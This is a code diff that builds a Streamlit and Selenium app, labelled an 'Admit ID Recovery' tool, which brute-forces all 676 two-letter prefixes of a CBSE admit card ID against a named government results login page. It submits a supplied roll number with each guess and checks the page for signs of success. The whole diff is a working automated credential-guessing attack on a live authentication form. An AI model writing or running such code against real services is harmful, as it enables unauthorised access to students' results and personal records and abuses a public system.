@@ -1,27 +1,118 @@
 import streamlit as st
 import os
+import time
+import string
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 from webdriver_manager.chrome import ChromeDriverManager
 
-def get_driver():
-    options = Options()
-    options.add_argument("--headless=new")
-    options.add_argument("--no-sandbox")
-    options.add_argument("--disable-dev-shm-usage")
-    options.add_argument("--disable-gpu")
-    
-    # Path where render-build.sh installs Chrome
-    chrome_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
-    
-    if os.path.exists(chrome_bin):
-        options.binary_location = chrome_bin
-    
-    # In 2026, webdriver-manager + Selenium 4.x handles the version matching
-    service = Service(ChromeDriverManager().install())
-    return webdriver.Chrome(service=service, options=options)
+# ====================== CONFIGURATION ======================
+URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"
 
-# --- Your Brute Force Logic Here ---
-st.title("CBSE Result Tool")
-# ... (rest of your code)
+def get_driver():
+    """Sets up Chrome for both Local and Render environments."""
+    chrome_options = Options()
+    chrome_options.add_argument("--headless=new")
+    chrome_options.add_argument("--no-sandbox")
+    chrome_options.add_argument("--disable-dev-shm-usage")
+    chrome_options.add_argument("--disable-gpu")
+    chrome_options.add_argument("--window-size=1280,720")
+    # Optimization: Don't load images to save RAM
+    chrome_options.add_argument("--blink-settings=imagesEnabled=false")
+    
+    # Path where render-build.sh installs Chrome on Render
+    render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
+    
+    if os.path.exists(render_bin):
+        chrome_options.binary_location = render_bin
+    
+    # webdriver-manager + Selenium 4.x handles the driver/browser sync
+    service = Service(ChromeDriverManager().install())
+    return webdriver.Chrome(service=service, options=chrome_options)
+
+def is_success(driver):
+    """Detects if we broke through to the result page."""
+    try:
+        # Check for error text
+        error_elements = driver.find_elements(By.ID, "err_msg")
+        if error_elements and error_elements[0].is_displayed():
+            if error_elements[0].text.strip():
+                return False
+        
+        # Check for success keywords
+        page_source = driver.page_source.lower()
+        keywords = ["marks", "subject", "grade", "total", "percentage", "pass"]
+        if any(word in page_source for word in keywords):
+            return True
+            
+        # Check for URL change (login page is usually .html, result page is often a route)
+        if "result" in driver.current_url.lower() and "html" not in driver.current_url.lower():
+            return True
+    except:
+        pass
+    return False
+
+# ====================== STREAMLIT UI ======================
+st.set_page_config(page_title="CBSE Recovery", page_icon="🔍")
+st.title("🔍 CBSE 12th Admit ID Recovery")
+
+# Inputs
+roll_number = st.text_input("Roll Number", value="18615900")
+known_suffix = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
+delay = st.slider("Wait time per attempt (Seconds)", 1.0, 5.0, 2.5)
+
+if st.button("🚀 Start Recovery", type="primary"):
+    if len(known_suffix) != 6:
+        st.error("The suffix must be exactly 6 characters.")
+    else:
+        # Using st.status helps keep the websocket connection alive on Render
+        with st.status("Initializing Browser...", expanded=True) as status:
+            driver = None
+            try:
+                driver = get_driver()
+                letters = string.ascii_uppercase
+                combos = [f"{a}{b}" for a in letters for b in letters]
+                
+                for i, prefix in enumerate(combos):
+                    full_id = f"{prefix}{known_suffix}"
+                    status.update(label=f"Testing: {full_id} ({i+1}/{len(combos)})", state="running")
+                    
+                    # 1. Reset page
+                    driver.get(URL)
+                    wait = WebDriverWait(driver, 10)
+                    
+                    # 2. Input and Submit
+                    try:
+                        roll_field = wait.until(EC.presence_of_element_located((By.ID, "rroll")))
+                        admn_field = driver.find_element(By.ID, "admn_id")
+                        
+                        roll_field.clear()
+                        roll_field.send_keys(roll_number)
+                        admn_field.clear()
+                        admn_field.send_keys(full_id)
+                        
+                        driver.find_element(By.ID, "submit").click()
+                        time.sleep(delay)
+
+                        if is_success(driver):
+                            status.update(label="✅ Success!", state="complete")
+                            st.balloons()
+                            st.success(f"**MATCH FOUND!** Admit Card ID: `{full_id}`")
+                            st.code(full_id)
+                            break
+                    except Exception as loop_e:
+                        st.write(f"⚠️ Error on {full_id}: Refreshing...")
+                        continue
+                else:
+                    status.update(label="❌ No Match Found", state="error")
+                    st.warning("All 676 combinations exhausted.")
+
+            except Exception as e:
+                st.error(f"Critical System Error: {e}")
+            finally:
+                if driver:
+                    driver.quit()
